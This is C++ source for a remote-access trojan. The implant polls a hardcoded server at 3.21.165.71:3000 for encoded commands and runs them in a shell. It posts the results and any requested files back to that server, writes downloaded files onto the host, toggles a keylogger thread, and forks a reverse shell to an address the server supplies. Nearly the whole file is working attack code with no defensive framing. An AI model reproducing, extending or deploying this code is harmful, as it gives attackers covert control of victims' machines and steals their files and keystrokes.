//
//  HTTPRequest
//

#include <iostream>
#include <fstream>
#include <streambuf>
#include <string>
#include <sstream>
#include <unistd.h>
#include <pthread.h>
#include "HTTPRequest.hpp"
#include "Base64/base64.cpp"
#include "json.hpp"
#include "keylogger.c"
#include "shell.cpp"

using namespace nlohmann;

std::string executeCommand(std::string cmd) {
	std::array<char, 128> buffer;
	std::string result;
	std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
	if (!pipe) {
		throw std::runtime_error("popen() failed!");
	}

	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
		result += buffer.data();
	}
	
	return result;
}

std::string postRequest(std::string url, std::string post_data, std::string cookie, std::string id) {
	
	std::string postResponse;
	try
	{
	    http::Request request(url);

	    const http::Response response = request.send("POST", post_data, {
		"Content-Type: text/plain;charset=UTF-8",
		"id: " + id,
		"Cookie: " + cookie
	    });
	    postResponse = std::string(response.body.begin(), response.body.end());
	}
	catch (const std::exception& e)
	{
	    std::cerr << "Request failed, error: " << e.what() << '\n';
	}
	
	std::cout << postResponse << std::endl;
	return postResponse;

}

int exfiltrateFile(std::string path, std::string id, std::string cookie) {

	std::ifstream t(path);
	std::stringstream buffer;
	buffer << t.rdbuf();

	std::string postResponse = postRequest("http://3.21.165.71:3000/exfiltrate", buffer.str(), cookie, id);

	return 0;

}


std::string makeRequest(std::string url, std::string cookie, std::string id) {

	std::string result;
        std::string output;

        http::InternetProtocol protocol = http::InternetProtocol::V4;

        http::Request request(url, protocol);

        const http::Response response = request.send("GET", "", {
            "Content-Type: application/x-www-form-urlencoded",
            "User-Agent: runscope/0.1",
	    "id: " + id,
	    "Cookie: " + cookie
        });

        if (response.status == http::Response::Ok &&
            !output.empty())
        {
            std::ofstream outfile(output, std::ofstream::binary);
            outfile.write(reinterpret_cast<const char*>(response.body.data()),
                          static_cast<std::streamsize>(response.body.size()));
        }
        else {
		std::cout << std::string(response.body.begin(), response.body.end()) << '\n';
		result = std::string(response.body.begin(), response.body.end()); 
	}

	return result;
}

int infiltrateFile(std::string path, std::string id, std::string cookie) {

	std::string response = makeRequest("http://3.21.165.71:3000/infiltrate", cookie, id);

	std::ofstream out(path);
	out << response;
	out.close();
	return 0;
}

json getCommands() {
	std::string command_encoded;
	std::string command_decoded;

	command_encoded = makeRequest("http://3.21.165.71:3000/getCommands", "", "69");

	command_decoded = base64_decode(command_encoded, false);
	std::cout << command_decoded << std:: endl;

	json j = json::parse(command_decoded);

	return j;
}

int sendCommandOutput(json j) {
	std::string cmd_output_encoded;

	std::string s = j.dump();

	cmd_output_encoded = base64_encode(s, false);

	std::cout << cmd_output_encoded << std::endl;

	std::string confirmation = makeRequest("http://3.21.165.71:3000/sendCommandOutput", cmd_output_encoded, "69");

	return 0;
}

/*
void *keylogger(void* arg) {
	int status = keylogPhysical((char*)arg);
	return NULL;
}

void *dropIntoShell(void* voidArgs) {

	parameters *args = (parameters*)voidArgs;
	int p;
	std::string ip;

	p = args->port;
	ip = args->ip;

	int status = reverseShell(ip, p);

	return NULL;
}
*/

int main() {
	pthread_t keylog_thread;
	pthread_t shell_thread;
	bool thread_started = false;


	while (true) {
		std::cout << "top of while loop" << std::endl;

		sleep(10);

		std::cout << "Finished sleeping" << std::endl;

		json j = getCommands();

		if (j.empty()) {
			continue;
		}

		for (auto& element : j["commands"].items()) {
			std::string epoch = element.key();
			std::string command = element.value();

			std::cout << "Found commands to Execute: " << std::endl;
			std::cout << epoch << ": " << command << std::endl;

			std::string exec_result = executeCommand(command);
			std::cout << exec_result << std::endl;

			element.value() = exec_result;
		}

		int status = sendCommandOutput(j["commands"]);
		std::cout << "Sent command output!" << std::endl;

		for (auto& element : j["exfiltrate"].items()) {

			std::string epoch = element.key();
			std::string file = element.value();

			std::cout << "Found files to download: " << std::endl;
			std::cout << epoch << ": " << file << std::endl;

			std::string id = "69";

			int status = exfiltrateFile(file, id, epoch);
		}
		std::cout << "Done sending files!" << std::endl;

		for (auto& element : j["infiltrate"].items()) {

			std::string epoch = element.key();
			std::string file = element.value();

			std::cout << "Found files to upload: " << std::endl;
			std::cout << epoch << ": " << file << std::endl;

			std::string id = "69";

			int status = infiltrateFile(file, id, epoch);
		}
		std::cout << "Done downloading files!" << std::endl;

		if (j["keylogger"] == "1" && (!thread_started)) {
			std::cout << "Starting Keylogger!" << std::endl;


			signal(SIGSEGV, sigintHandler);
			char* file_keylog = "test.txt";
			pthread_create(&keylog_thread, NULL, keylogPhysical, file_keylog);
			thread_started = true;

			//pthread_join(keylog_thread, NULL);
			std::cout << "Started Keylogger" << std::endl;

		} else if (j["keylogger"] != "1" && thread_started) {

			std::cout << "Stopping Keylogger" << std::endl;

			//pthread_exit(NULL);
			pthread_kill(keylog_thread, SIGSEGV);

			pthread_join(keylog_thread, NULL);

			std::cout << "Stopped Keylogger" << std::endl;

		}

		if (j["shell"]["port"] != "0" && j["shell"]["ip"] != "0.0.0.0") {

			std::cout << "Dropping into shell on port " << j["shell"] << std::endl;

			parameters rev_params;
			rev_params.ip = j["shell"]["ip"];
			std::string port_s = j["shell"]["port"];
			rev_params.port = stoi(port_s);


			pid_t pid = fork();
			if (!pid) {
				reverseShell(&rev_params);
			}
			//pthread_create(&shell_thread, NULL, reverseShell, &rev_params);
			std::cout << "Dropped into shell!" << std::endl;
		}
		std::cout << "Executed all commands!" << std::endl;

		//return 0;


	}

	return 0;

}

